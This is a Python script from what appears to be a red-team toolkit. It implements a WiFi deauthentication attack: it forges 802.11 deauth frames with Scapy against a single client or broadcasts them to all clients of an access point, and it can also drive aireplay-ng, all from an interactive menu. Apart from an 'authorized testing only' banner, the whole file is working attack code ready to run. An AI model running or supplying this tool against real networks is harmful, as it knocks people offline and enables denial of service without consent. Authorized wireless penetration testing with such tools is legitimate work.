#!/usr/bin/env python3
"""
Red Team Tools - Deauthentication Attack
WiFi deauth for authorized testing
For authorized security testing only - Linux/Kali
"""

import sys
import os
import subprocess
import time
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class DeauthAttack:
    """WiFi Deauthentication attack tool"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
    
    def deauth_client(self, target_mac: str, gateway_mac: str, count: int = 10, 
                      interval: float = 0.1) -> bool:
        """Send deauth packets to specific client"""
        if not SCAPY_AVAILABLE:
            error("Scapy not available")
            return False
        
        if not self._check_root():
            error("Root required")
            return False
        
        info(f"Sending {count} deauth packets to {target_mac}")
        
        # Create deauth packet
        # From AP to client
        pkt1 = RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=target_mac,  # Destination
            addr2=gateway_mac,  # Source (AP)
            addr3=gateway_mac   # BSSID
        ) / Dot11Deauth(reason=7)
        
        # From client to AP
        pkt2 = RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=gateway_mac,
            addr2=target_mac,
            addr3=gateway_mac
        ) / Dot11Deauth(reason=7)
        
        self.running = True
        sent = 0
        
        try:
            for i in range(count):
                if not self.running:
                    break
                
                sendp(pkt1, iface=self.interface, verbose=False)
                sendp(pkt2, iface=self.interface, verbose=False)
                sent += 2
                
                progress_bar(i + 1, count, "  Sending")
                time.sleep(interval)
            
            print()
            success(f"Sent {sent} deauth packets")
            return True
            
        except Exception as e:
            print()
            error(f"Failed: {e}")
            return False
        finally:
            self.running = False
    
    def deauth_all(self, gateway_mac: str, count: int = 10, interval: float = 0.1) -> bool:
        """Broadcast deauth to all clients on network"""
        return self.deauth_client("ff:ff:ff:ff:ff:ff", gateway_mac, count, interval)
    
    def deauth_aireplay(self, target_mac: str, gateway_mac: str, count: int = 10) -> bool:
        """Use aireplay-ng for deauth attack"""
        if not self._check_root():
            error("Root required")
            return False
        
        # Check aireplay-ng
        if not shutil.which('aireplay-ng'):
            error("aireplay-ng not installed")
            return False
        
        info(f"Deauth attack using aireplay-ng")
        
        cmd = [
            'aireplay-ng',
            '-0', str(count),      # Deauth count
            '-a', gateway_mac,      # AP MAC
            '-c', target_mac,       # Client MAC
            self.interface
        ]
        
        if target_mac.lower() == 'ff:ff:ff:ff:ff:ff':
            # Broadcast - remove client specification
            cmd = ['aireplay-ng', '-0', str(count), '-a', gateway_mac, self.interface]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                success("Deauth attack completed")
                return True
            else:
                error(f"Failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            warning("Attack timed out")
            return False
        except Exception as e:
            error(f"Error: {e}")
            return False
    
    def stop(self):
        """Stop running attack"""
        self.running = False
    
    def _check_root(self) -> bool:
        return os.geteuid() == 0


import shutil

def interactive_mode():
    """Interactive deauth attack"""
    clear_screen()
    print_banner("DEAUTH", font="small", color="red")
    
    print(f"{R}{'═' * 50}{RESET}")
    print(f"{Y}⚠  AUTHORIZED TESTING ONLY{RESET}")
    print(f"{Y}⚠  May disrupt network connectivity{RESET}")
    print(f"{R}{'═' * 50}{RESET}\n")
    
    if os.geteuid() != 0:
        error("Root privileges required!")
        input(f"\n{C}Press Enter...{RESET}")
        return
    
    while True:
        print(f"\n{C}OPTIONS{RESET}")
        print(f"  {Y}[1]{RESET} Deauth Single Client (Scapy)")
        print(f"  {Y}[2]{RESET} Deauth All Clients (Scapy)")
        print(f"  {Y}[3]{RESET} Deauth with aireplay-ng")
        print(f"  {R}[0]{RESET} Back")
        
        choice = prompt("Select").strip()
        
        if choice == "0":
            break
        
        elif choice == "1":
            if not SCAPY_AVAILABLE:
                error("Scapy not installed")
                continue
            
            iface = prompt("Monitor interface (e.g., wlan0mon)").strip()
            target = prompt("Target client MAC").strip()
            gateway = prompt("AP/Gateway MAC (BSSID)").strip()
            count = int(prompt("Packet count [100]").strip() or "100")
            
            if not all([iface, target, gateway]):
                error("All fields required")
                continue
            
            attack = DeauthAttack(iface)
            attack.deauth_client(target, gateway, count)
        
        elif choice == "2":
            if not SCAPY_AVAILABLE:
                error("Scapy not installed")
                continue
            
            iface = prompt("Monitor interface").strip()
            gateway = prompt("AP/Gateway MAC (BSSID)").strip()
            count = int(prompt("Packet count [100]").strip() or "100")
            
            attack = DeauthAttack(iface)
            attack.deauth_all(gateway, count)
        
        elif choice == "3":
            iface = prompt("Monitor interface").strip()
            gateway = prompt("AP MAC (BSSID)").strip()
            target = prompt("Target MAC [broadcast]").strip() or "ff:ff:ff:ff:ff:ff"
            count = int(prompt("Count [10]").strip() or "10")
            
            attack = DeauthAttack(iface)
            attack.deauth_aireplay(target, gateway, count)
    
    input(f"\n{C}Press Enter...{RESET}")


if __name__ == "__main__":
    interactive_mode()
